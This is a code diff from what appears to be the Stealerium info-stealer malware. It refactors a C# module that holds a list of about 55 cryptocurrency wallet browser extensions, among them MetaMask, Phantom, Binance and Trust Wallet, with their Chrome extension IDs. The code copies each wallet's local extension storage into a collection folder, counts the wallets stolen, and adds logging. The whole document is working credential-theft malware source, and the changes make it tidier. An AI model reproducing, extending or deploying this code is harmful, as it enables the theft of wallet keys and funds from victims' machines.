@@ -7,317 +7,121 @@ namespace Stealerium.Target.Browsers.Chromium
 {
     internal class Extensions
     {
-        private static readonly List<string[]> ChromeWalletsDirectories = new List<string[]>
+        // Dictionary for storing wallet names and corresponding Chrome extension paths
+        private static readonly Dictionary<string, string> ChromeWalletsDirectories = new Dictionary<string, string>
         {
-    new[]
-    {
-        "Chrome_Authenticator",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"
-    },
-    new[]
-    {
-        "Chrome_Binance",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"
-    },
-    new[]
-    {
-        "Chrome_Bitapp",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"
-    },
-    new[]
-    {
-        "Chrome_BoltX",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"
-    },
-    new[]
-    {
-        "Chrome_Coin98",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"
-    },
-    new[]
-    {
-        "Chrome_Coinbase",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"
-    },
-    new[]
-    {
-        "Chrome_Core",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb"
-    },
-    new[]
-    {
-        "Chrome_Crocobit",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"
-    },
-    new[]
-    {
-        "Chrome_Equal",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"
-    },
-    new[]
-    {
-        "Chrome_Ever",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"
-    },
-    new[]
-    {
-        "Chrome_ExodusWeb3",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"
-    },
-    new[]
-    {
-        "Chrome_Fewcha",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"
-    },
-    new[]
-    {
-        "Chrome_Finnie",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"
-    },
-    new[]
-    {
-        "Chrome_Guarda",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"
-    },
-    new[]
-    {
-        "Chrome_Guild",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"
-    },
-    new[]
-    {
-        "Chrome_HarmonyOutdated",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"
-    },
-    new[]
-    {
-        "Chrome_Iconex",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"
-    },
-    new[]
-    {
-        "Chrome_Jaxx Liberty",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"
-    },
-    new[]
-    {
-        "Chrome_Kaikas",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi"
-    },
-    new[]
-    {
-        "Chrome_KardiaChain",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"
-    },
-    new[]
-    {
-        "Chrome_Keplr",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"
-    },
-    new[]
-    {
-        "Chrome_Liquality",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"
-    },
-    new[]
-    {
-        "Chrome_MEWCX",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"
-    },
-    new[]
-    {
-        "Chrome_MaiarDEFI",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"
-    },
-    new[]
-    {
-        "Chrome_Martian",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"
-    },
-    new[]
-    {
-        "Chrome_Math",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"
-    },
-    new[]
-    {
-        "Chrome_Metamask",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
-    },
-    new[]
-    {
-        "Chrome_Metamask2",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"
-    },
-    new[]
-    {
-        "Chrome_Mobox",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"
-    },
-    new[]
-    {
-        "Chrome_Nami",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"
-    },
-    new[]
-    {
-        "Chrome_Nifty",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"
-    },
-    new[]
-    {
-        "Chrome_Oxygen",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"
-    },
-    new[]
-    {
-        "Chrome_PaliWallet",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"
-    },
-    new[]
-    {
-        "Chrome_Petra",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"
-    },
-    new[]
-    {
-        "Chrome_Phantom",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"
-    },
-    new[]
-    {
-        "Chrome_Pontem",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba"
-    },
-    new[]
-    {
-        "Chrome_Ronin",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"
-    },
-    new[]
-    {
-        "Chrome_Safepal",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"
-    },
-    new[]
-    {
-        "Chrome_Saturn",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig"
-    },
-    new[]
-    {
-        "Chrome_Slope",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"
-    },
-    new[]
-    {
-        "Chrome_Solfare",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\khacbfnclnjfjakompbldhceolaealdn"
-    },
-    new[]
-    {
-        "Chrome_Sollet",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"
-    },
-    new[]
-    {
-        "Chrome_Starcoin",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"
-    },
-    new[]
-    {
-        "Chrome_Swash",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"
-    },
-    new[]
-    {
-        "Chrome_TempleTezos",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"
-    },
-    new[]
-    {
-        "Chrome_TerraStation",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"
-    },
-    new[]
-    {
-        "Chrome_Tokenpocket",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii"
-    },
-    new[]
-    {
-        "Chrome_Ton",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"
-    },
-    new[]
-    {
-        "Chrome_Tonkeeper",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ogaghekfbbibgpkeboogffmphcecpbga"
-    },
-    new[]
-    {
-        "Chrome_Tron",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"
-    },
-    new[]
-    {
-        "Chrome_Trust Wallet",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"
-    },
-    new[]
-    {
-        "Chrome_Wombat",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"
-    },
-    new[]
-    {
-        "Chrome_XDEFI",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"
-    },
-    new[]
-    {
-        "Chrome_XMR.PT",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm"
-    },
-    new[]
-    {
-        "Chrome_XinPay",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"
-    },
-    new[]
-    {
-        "Chrome_Yoroi",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"
-    },
-    new[]
-    {
-        "Chrome_iWallet",
-        Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"
-    }
-};
+            { "Chrome_Authenticator", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bhghoamapcdpbohphigoooaddinpkbai") },
+            { "Chrome_Binance", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fhbohimaelbohpjbbldcngcnapndodjp") },
+            { "Chrome_Bitapp", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fihkakfobkmkjojpchpfgcmhfjnmnfpi") },
+            { "Chrome_BoltX", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "aodkkagnadcbobfpggfnjeongemjbjca") },
+            { "Chrome_Coin98", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "aeachknmefphepccionboohckonoeemg") },
+            { "Chrome_Coinbase", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "hnfanknocfeofbddgcijnmhnfnkdnaad") },
+            { "Chrome_Core", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "agoakfejjabomempkjlepdflaleeobhb") },
+            { "Chrome_Crocobit", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "pnlfjmlcjdjgkddecgincndfgegkecke") },
+            { "Chrome_Equal", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "blnieiiffboillknjnepogjhkgnoapac") },
+            { "Chrome_Ever", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "cgeeodpfagjceefieflmdfphplkenlfk") },
+            { "Chrome_ExodusWeb3", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "aholpfdialjgjfhomihkjbmgjidlcdno") },
+            { "Chrome_Fewcha", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ebfidpplhabeedpnhjnobghokpiioolj") },
+            { "Chrome_Finnie", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "cjmkndjhnagcfbpiemnkdpomccnjblmj") },
+            { "Chrome_Guarda", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "hpglfhgfnhbgpjdenjgmdgoeiappafln") },
+            { "Chrome_Guild", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nanjmdknhkinifnkgdcggcfnhdaammmj") },
+            { "Chrome_HarmonyOutdated", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fnnegphlobjdpkhecapkijjdkgcjhkib") },
+            { "Chrome_Iconex", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "flpiciilemghbmfalicajoolhkkenfel") },
+            { "Chrome_JaxxLiberty", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "cjelfplplebdjjenllpjcblmjkfcffne") },
+            { "Chrome_Kaikas", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "jblndlipeogpafnldhgmapagcccfchpi") },
+            { "Chrome_KardiaChain", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "pdadjkfkgcafgbceimcpbkalnfnepbnk") },
+            { "Chrome_Keplr", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "dmkamcknogkgcdfhhbddcghachkejeap") },
+            { "Chrome_Liquality", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "kpfopkelmapcoipemfendmdcghnegimn") },
+            { "Chrome_MEWCX", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nlbmnnijcnlegkjjpcfjclmcfggfefdm") },
+            { "Chrome_MaiarDEFI", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "dngmlblcodfobpdpecaadgfbcggfjfnm") },
+            { "Chrome_Martian", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "efbglgofoippbgcjepnhiblaibcnclgk") },
+            { "Chrome_Math", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "afbcbjpbpfadlkmhmclhkeeodmamcflc") },
+            { "Chrome_Metamask", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn") },
+            { "Chrome_Metamask2", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm") },
+            { "Chrome_Mobox", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fcckkdbjnoikooededlapcalpionmalo") },
+            { "Chrome_Nami", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "lpfcbjknijpeeillifnkikgncikgfhdo") },
+            { "Chrome_Nifty", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "jbdaocneiiinmjbjlgalhcelgbejmnid") },
+            { "Chrome_Oxygen", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fhilaheimglignddkjgofkcbgekhenbh") },
+            { "Chrome_PaliWallet", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "mgffkfbidihjpoaomajlbgchddlicgpn") },
+            { "Chrome_Petra", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ejjladinnckdgjemekebdpeokbikhfci") },
+            { "Chrome_Phantom", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa") },
+            { "Chrome_Pontem", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "phkbamefinggmakgklpkljjmgibohnba") },
+            { "Chrome_Ronin", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec") },
+            { "Chrome_Safepal", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "lgmpcpglpngdoalbgeoldeajfclnhafa") },
+            { "Chrome_Saturn", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkddgncdjgjfcddamfgcmfnlhccnimig") },
+            { "Chrome_Slope", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "pocmplpaccanhmnllbbkpgfliimjljgo") },
+            { "Chrome_Solfare", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "khacbfnclnjfjakompbldhceolaealdn") },
+            { "Chrome_Sollet", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fhmfendgdocmcbmfikdcogofphimnkno") },
+            { "Chrome_Starcoin", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "mfhbebgoclkghebffdldpobeajmbecfk") },
+            { "Chrome_Swash", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "cmndjbecilbocjfkibfbifhngkdmjgog") },
+            { "Chrome_TempleTezos", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ookjlbkiijinhpmnjffcofjonbfbgaoc") },
+            { "Chrome_TerraStation", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "aiifbnbfobpmeekipheeijimdpnlpgpp") },
+            { "Chrome_Tokenpocket", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "mfgccjchihfkkindfppnaooecgfneiii") },
+            { "Chrome_Ton", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nphplpgoakhhjchkkhmiggakijnkhfnd") },
+            { "Chrome_Tonkeeper", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ogaghekfbbibgpkeboogffmphcecpbga") },
+            { "Chrome_Tron", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ibnejdfjmmkpcnlpebklmnkoeoihofec") },
+            { "Chrome_TrustWallet", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "egjidjbpglichdcondbcbdnbeeppgdph") },
+            { "Chrome_Wombat", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "amkmjjmmflddogmhpjloimipbofnfjih") },
+            { "Chrome_XDEFI", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "hmeobnfnfcmdkdcmlblgagmfpfboieaf") },
+            { "Chrome_XMR.PT", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "eigblbgjknlfbajkfhopmcojidlgcehm") },
+            { "Chrome_XinPay", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bocpokimicclpaiekenaeelehdjllofo") },
+            { "Chrome_Yoroi", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ffnbelfdoeiohenkjibnmadjiehjhajb") },
+            { "Chrome_iWallet", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "kncchdigobghenbbaddojjnnaogfppfj") }
+        };
 
-        public static void GetChromeWallets(string sSaveDir)
+        // Main method to get Chrome wallets and save them to a directory
+        public static void GetChromeWallets(string saveDirectory)
         {
             try
             {
-                Directory.CreateDirectory(sSaveDir);
+                int walletsCopied = 0;
 
-                foreach (var array in ChromeWalletsDirectories) CopyWalletFromDirectoryTo(sSaveDir, array[1], array[0]);
-                if (Counter.BrowserWallets == 0) Filemanager.RecursiveDelete(sSaveDir);
+                // Iterate through each wallet directory in the dictionary and attempt to copy it
+                foreach (var wallet in ChromeWalletsDirectories)
+                {
+                    walletsCopied += CopyWalletFromDirectoryTo(saveDirectory, wallet.Value, wallet.Key) ? 1 : 0;
+                }
+
+                // If no wallets were copied, delete the save directory
+                if (walletsCopied == 0)
+                {
+                    Logging.Log("No wallets found. Deleting save directory.");
+                    Filemanager.RecursiveDelete(saveDirectory);
+                }
             }
             catch (Exception ex)
             {
-                Logging.Log("Chrome Browser Wallets >> Failed to collect wallets from Chrome browser\n" + ex);
+                Logging.Log($"Failed to collect wallets from Chrome browser: {ex.Message}");
             }
         }
 
-        // Copy wallet files to directory
-        private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
+        // Helper method to copy wallet files from source directory to target directory
+        private static bool CopyWalletFromDirectoryTo(string saveDirectory, string walletDirectory, string walletName)
         {
-            var sdir = Path.Combine(sSaveDir, sWalletName);
-            if (!Directory.Exists(sWalletDir)) return;
-            Filemanager.CopyDirectory(sWalletDir, sdir);
-            Counter.BrowserWallets++;
+            try
+            {
+                // Check if the wallet directory exists
+                if (!Directory.Exists(walletDirectory))
+                {
+                    Logging.Log($"Wallet directory not found: {walletDirectory}");
+                    return false;
+                }
+
+                // Create destination directory and copy files
+                var destinationDirectory = Path.Combine(saveDirectory, walletName);
+                Directory.CreateDirectory(destinationDirectory);
+                Filemanager.CopyDirectory(walletDirectory, destinationDirectory);
+
+                // Log success and increment the wallet counter
+                Logging.Log($"Copied wallet: {walletName} to {destinationDirectory}");
+                Counter.BrowserWallets++;
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"Error copying wallet {walletName}: {ex.Message}");
+                return false;
+            }
         }
     }
 }
